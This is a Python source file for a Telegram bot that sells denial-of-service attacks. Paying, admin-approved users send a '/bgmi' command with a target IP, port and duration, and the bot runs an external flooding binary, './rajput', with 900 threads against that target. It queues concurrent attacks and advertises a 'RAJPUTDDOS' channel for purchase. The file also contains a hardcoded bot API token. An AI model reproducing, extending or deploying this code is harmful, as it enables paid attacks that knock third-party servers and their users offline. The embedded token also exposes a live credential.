import asyncio
import logging
import json
import telebot
from threading import Thread, Lock
from queue import Queue
import re
import os

# Load configuration
bot = telebot.TeleBot('7509113069:AAEomwzwLl6rsN-YfI8b-dN0jRRSsHf7hZs')  # Set timeout to 60 seconds

async def send_message_with_retry(chat_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.send_message(chat_id, text)
            return  # Exit on success
        except Exception as e:
            logging.error(f"Failed to send message (Attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                await asyncio.sleep(2)  # Wait before retrying
            else:
                logging.error(f"Could not send message after {retries} attempts.")


# Load approved users from file
def load_approved_users():
    if os.path.exists('approved_users.json'):
        with open('approved_users.json') as f:
            return set(json.load(f))
    return set()

# Save approved users to file
def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(list(approved_users), f)

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_queue = Queue()  # Queue for managing attack requests
max_concurrent_attacks = 10  # Maximum number of concurrent attacks
loop = asyncio.new_event_loop()  # Create a new event loop

# Load initial approved users
approved_users = load_approved_users()

# Number of threads to use for attacks
THREADS = 900

# Set up logging
logging.basicConfig(level=logging.INFO)

# Async function to run attack command
async def run_attack_command_on_codespace(bot: telebot.TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
    command = f"./rajput {target_ip} {target_port} {duration} {THREADS}"
    logging.info(f"Running command: {command}")

    for attempt in range(3):  # Retry up to 3 times
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            output = stdout.decode().strip()
            error = stderr.decode().strip()

            if output:
                logging.info(f"Command output: {output}")
            if error:
                logging.error(f"Command error: {error}. Command: {command}")

            await send_message_with_retry(chat_id, f"Attack Finished Successfully 🚀\nTarget: {target_ip}:{target_port}\nDuration: {duration} seconds.  https://t.me/RAJPUTDDOS1")
            break  # Exit loop on success
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed: {e}")
            if attempt < 2:  # If not the last attempt
                await asyncio.sleep(2)  # Wait before retrying
            else:
                await send_message_with_retry(chat_id, "❌ An error occurred while executing the attack command. Please try again later.")
        finally:
            attack_queue.task_done()  # Ensure this is called after each attempt


# Function to process attack queue
def process_attack_queue():
    while True:
        user_id, target_ip, target_port, duration, chat_id = attack_queue.get()

        # Process the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(bot, target_ip, target_port, duration, chat_id), loop)

# Attack command
@bot.message_handler(commands=['bgmi'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_private = message.chat.type == 'private'

    if is_private and user_id not in approved_users:
        bot.send_message(chat_id, "❌ YE BOT FREE NAHI H DM TO BUY @RAJPUTDDOS❌.")
        return

    logging.info(f"Received command from user {user_id}: {message.text}")

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Please use:\n /bgmi <IP> <PORT> <TIME> *", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Validate IP address format
        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_ip):
            bot.send_message(chat_id, "*Invalid IP address format.*", parse_mode='Markdown')
            return

        # Validate port range
        if not (1 <= target_port <= 65535):
            bot.send_message(chat_id, "*Port must be between 1 and 65535.*", parse_mode='Markdown')
            return

        # Validate duration
        if duration <= 0 or duration > 400:
            bot.send_message(chat_id, "*Duration must be greater than 0 and not more than 400 seconds.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Send confirmation message immediately after putting the attack in the queue
        bot.send_message(chat_id, "🚀 Attack Sent Successfully! 🚀\n\n"
                                   f"Target: {target_ip}:{target_port}\n"
                                   f"Attack Time: {duration} seconds\n\n"
                                   f"https://t.me/RAJPUTDDOS1\n")

        attack_queue.put((user_id, target_ip, target_port, duration, chat_id))

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "❌ An error occurred while processing your command. Please try again later.")

# Add approved user command
@bot.message_handler(commands=['add'])
def add_approved_user(message):
    admin_id = 1821595166  # Replace with the actual admin user ID
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id != admin_id:
        bot.send_message(chat_id, "❌ You do not have permission to use this command.")
        return

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 1:
            bot.send_message(chat_id, "*Invalid command format. Please use:\n /add <User_Id>*", parse_mode='Markdown')
            return

        new_user_id = int(args[0])

        # Add user to the approved users
        approved_users.add(new_user_id)
        save_approved_users(approved_users)  # Save to file

        bot.send_message(chat_id, f"✅ User {new_user_id} has been approved.")
    except Exception as e:
        logging.error(f"Error in adding approved user: {e}")
        bot.send_message(chat_id, "❌ An error occurred while adding the user.")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Start the bot
if __name__ == '__main__':
    thread = Thread(target=start_asyncio_thread)
    thread.start()

    # Start the processing thread for the attack queue
    Thread(target=process_attack_queue, daemon=True).start()

    bot.polling()
